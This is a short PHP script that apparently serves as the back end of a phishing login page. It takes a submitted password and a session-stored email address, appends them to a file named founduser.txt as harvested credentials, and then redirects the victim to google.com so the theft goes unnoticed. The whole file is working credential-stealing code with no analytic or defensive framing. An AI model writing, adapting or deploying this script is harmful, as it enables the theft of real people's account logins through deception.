<?php
session_start();

$pass = $_POST["password"];
$email=$_SESSION["Email"];

 $co = "===========================================\n";
 $cl = "===========================================\n";
 $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
 $us = "Username: $email\n";
 $pa = "Password: $pass\n";
 fwrite($fileuser, "\n". $co. $us. $pa. $cl);
 fclose($fileuser);
header('Location: https://google.com');
exit();
session_destroy();
?>
